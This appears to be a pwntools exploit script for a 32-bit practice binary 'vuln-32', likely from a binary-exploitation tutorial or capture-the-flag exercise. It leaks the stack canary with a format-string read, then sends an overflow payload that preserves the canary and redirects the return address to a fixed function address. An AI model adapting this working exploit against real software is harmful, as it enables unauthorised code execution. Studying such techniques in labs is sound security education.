from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

# Get canary
log.info(p.clean())
p.sendline(b'%23$p')
canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

# Second gets
payload = b'x'*64 + p32(canary) + b'x'*12 + p32(0x08049245) + p32(0x0)

log.info(p.clean())
p.sendline(payload)
log.success(p.clean())
